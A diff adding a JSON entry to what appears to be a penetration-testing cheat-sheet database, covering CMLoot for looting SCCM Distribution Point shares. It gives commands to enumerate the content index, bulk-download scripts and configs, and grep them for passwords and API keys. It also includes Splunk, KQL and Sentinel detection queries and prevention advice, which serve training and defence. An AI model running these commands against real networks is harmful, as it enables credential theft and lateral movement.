@@ -1,0 +1,106 @@
+{
+  "id": "sccm-cmloot-dp-looting",
+  "name": "CMLoot - SCCM Distribution Point Looting",
+  "command": "Invoke-CMLootInventory -SCCMHost <target> -Outfile inventory.txt",
+  "description": "SCCM Distribution Points expose package content over an (often anonymously readable) SMB share (SCCMContentLib$ / the DataLib). CMLoot reads the DataLib .INI index to enumerate every file staged on the DP, then selectively downloads them - scripts, MSIs, configuration files, and task-sequence content that frequently contain hardcoded credentials, connection strings, and secrets. This is a low-noise, pre-auth-adjacent loot of the whole software estate.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Active Directory",
+  "subcategory": "SCCM Attacks",
+  "certifications": [
+    "CRTP"
+  ],
+  "primary_cert": "CRTP",
+  "source": "1njection/CMLoot",
+  "tags": [
+    "sccm",
+    "mecm",
+    "cmloot",
+    "distribution-point",
+    "smb",
+    "loot",
+    "credential-access"
+  ],
+  "mitre": [
+    "T1552.001",
+    "T1039"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== INVENTORY THE DP (read the DataLib index) ===\n  # PowerShell (original CMLoot):\n  Invoke-CMLootInventory -SCCMHost <target> -Outfile inventory.txt\n  # Enumerates \\\\<dp>\\SCCMContentLib$ via the .INI files in DataLib - no download yet\n\n=== DOWNLOAD SELECTIVELY ===\n  # Grab everything of a given extension (scripts are gold):\n  Invoke-CMLootDownload -InventoryFile inventory.txt -Extension ps1\n  Invoke-CMLootDownload -InventoryFile inventory.txt -Extension config\n  # Or pull a single file:\n  Invoke-CMLootDownload -SingleFile \\\\<dp>\\SCCMContentLib$\\DataLib\\<pkg>\n\n=== HUNT FOR SECRETS ===\n  # After download, grep the loot for creds/connection strings:\n  Select-String -Path .\\CMLootOut\\* -Pattern \"password|pwd|connectionString|secret|apikey\"\n  # Python port offers the same against anonymous SMB:\n  cmloot.py <dc_ip>/<user>:<password>@<target>\n\n=== WHY IT WORKS ===\n  - SCCMContentLib$ is commonly readable by Authenticated Users (sometimes anonymous).\n  - Packaged scripts/installers embed service-account creds and API keys.\n\n=== ALTERNATIVES ===\n  snaffler / PowerHuntShares    # general share credential hunting\n  SharpSCCM get secrets         # NAA / policy secrets instead of content",
+  "examples": [
+    {
+      "label": "Inventory DP content index",
+      "command": "Invoke-CMLootInventory -SCCMHost <target> -Outfile inventory.txt"
+    },
+    {
+      "label": "Download all PowerShell scripts",
+      "command": "Invoke-CMLootDownload -InventoryFile inventory.txt -Extension ps1"
+    },
+    {
+      "label": "Loot via the Python port",
+      "command": "cmloot.py <dc_ip>/<user>:<password>@<target>"
+    }
+  ],
+  "references": [
+    {
+      "title": "CMLoot",
+      "url": "https://github.com/1njection/CMLoot"
+    },
+    {
+      "title": "Misconfiguration Manager - CRED-5 (DP looting)",
+      "url": "https://github.com/subat0mik/Misconfiguration-Manager"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sccm-sccmhunter-recon",
+      "note": "Identify the Distribution Points to loot.",
+      "rel": "prereq"
+    },
+    {
+      "id": "sccm-naa-credential-extract",
+      "note": "Policy secrets are a parallel SCCM credential source.",
+      "rel": "alternative"
+    },
+    {
+      "id": "snaffler",
+      "note": "General share hunting for credentials beyond the DP.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Distribution Point content is served from the SCCMContentLib$ SMB share, whose DataLib holds an .INI index of every staged file. Default ACLs often permit Authenticated Users (or anonymous) read, so any domain user can enumerate and pull packaged scripts and installers that commonly embed secrets.",
+    "prerequisites": "SMB read access to \\\\<dp>\\SCCMContentLib$ - usually a domain account, sometimes anonymous on misconfigured DPs.",
+    "impact": "Disclosure of hardcoded credentials, connection strings, and API keys embedded in deployed packages/scripts, enabling privilege escalation and lateral movement.",
+    "detection": "[MITRE T1039] High-volume read access to SCCMContentLib$ / DataLib from a single account; access to many .INI index files followed by bulk file reads from a non-SCCM host.",
+    "artifacts": "Windows file-share audit (5140/5145) on SCCMContentLib$; Sysmon network connections to TCP 445 on the DP; bulk SMB reads of DataLib .INI files.",
+    "splunk_spl": "index=windows EventCode=5145 Share_Name=\"*SCCMContentLib*\"\n| stats count dc(Relative_Target_Name) as files by Account_Name, src_ip\n| where files > 50",
+    "elastic_kql": "event.code:\"5145\" and winlog.event_data.ShareName:*SCCMContentLib*",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 5145\n| where ShareName has \"SCCMContentLib\"\n| summarize Files=dcount(RelativeTargetName) by SubjectUserName, IpAddress, bin(TimeGenerated, 1h)\n| where Files > 50",
+    "sigma_rules": "win_sccm_contentlib_mass_read",
+    "prevention": "Restrict SCCMContentLib$ ACLs to required accounts; never embed credentials in packaged scripts/installers (use runtime secret retrieval); audit deployed content for secrets; enable share access auditing and alert on bulk DataLib enumeration from non-SCCM hosts.",
+    "sources": [
+      "https://github.com/1njection/CMLoot",
+      "https://github.com/subat0mik/Misconfiguration-Manager"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Mass read of SCCM Distribution Point content share",
+        "logic": "SecurityEvent\n| where EventID == 5145\n| where ShareName has \"SCCMContentLib\"\n| summarize Files=dcount(RelativeTargetName) by SubjectUserName, IpAddress, bin(TimeGenerated, 1h)\n| where Files > 50",
+        "data_source": "windows-security",
+        "log_ids": [
+          "5145"
+        ],
+        "attack": [
+          "T1039"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "SCCM clients and content-distribution processes read this share routinely.",
+        "tuning": "Baseline normal client access; alert on bulk DataLib reads from workstation/non-client source IPs."
+      }
+    ]
+  }
+}
